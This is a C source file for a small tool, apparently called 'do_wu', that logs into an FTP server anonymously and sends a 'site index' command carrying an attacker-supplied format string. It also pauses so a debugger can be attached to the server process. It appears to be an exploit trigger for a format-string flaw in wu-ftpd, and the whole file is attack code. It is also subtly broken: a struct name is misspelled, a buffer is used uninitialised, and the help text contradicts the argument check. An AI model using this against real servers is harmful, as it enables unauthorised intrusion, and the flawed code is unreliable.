    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <sys/time.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <signal.h>
    #include <errno.h>

    int connect_to_server(char *host);
    int receive_from_server(int s, int print);
    int ftp_send(int s, char *data);
    int help_page();


    int main(int argc, char *argv[]){
        int s;
        char buff[1024*64];
        char tmp[4096];

        if(argc !=4)
            return help_page();
        
        s = connect_to_server(argv[1]);
        if(s<=0)
            _exit(-1);

        receive_from_server(s, 0);
        ftp_send(s, "user anonymous\n");
        receive_from_server(s, 0);
        ftp_send(s, "pass foo@example.com\n");
        receive_from_server(s, 0);

        if(atoi(argv[3]) == 1){
            printf("This is to be able to hook gdb to the child proccess, enter any charhacter to continue");
            getc(stdin);
        }

        strlcat(buff, "site index ", sizeof(buff));
        sprintf(tmp, "%.4000s\n", argv[2]);

        strlcat(buff, tmp, sizeof(buff));
        ftp_send(s, buff);

        receive_from_server(s, 1);
        shutdown(s, SHUT_RDWR);
        return 1;
    }


    int connect_to_server(char *host){
        struct hostnet  *hp;
        struct sockaddr_in cl;
        int sock;
        if(host == NULL || *host==(char)0){
            fprintf(stderr, "Invalid hostname\n");
            exit(1);
        }
        
        if((cl.sin_addr.s_addr=inet_addr(host)) == -1){
            if((hp=gethostbyname(host)) == NULL){
                fprintf(stderr, "Cannot resolve %s\n", host);
                exit(1);
            }
            memcpy((char*)&cl.sin_addr, (char*)hp->h_addr,sizeof(cl.sin_addr));
        }

        if((sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1){
            fprintf(stderr, "There was an error creating the socket: \n%s", strerror(errno));
        }

        cl.sin_family = PF_INET;
        cl.sin_port = htons(21);

        if(connect(sock, (struct sockaddr*)&cl, sizeof(cl)) == -1){
            fprintf(stderr, "There was an error connecting to the server: %s \n%s", host, strerror(errno));
        }
        return sock;
    }


    int receive_from_server(int s, int print){
        int ret_val;
        char buff[1024*64];

        memset(buff, 0, 1024*64);
        ret_val = recv(s, buff, (1024*63), 0);

        if(ret_val > 0){
            if(print)
                printf("%s", buff);
        }
        else{
            if(print)
                printf("there is nothing to print");
            
            return 0;
        }

        return 1;
    }


    int ftp_send(int s, char *data){
        send(s, data, strlen(data), 0);
        return 1;
    }

    int help_page(){
        printf("Use\ndo_wu <host> <format string>\n");
        return 1;
    }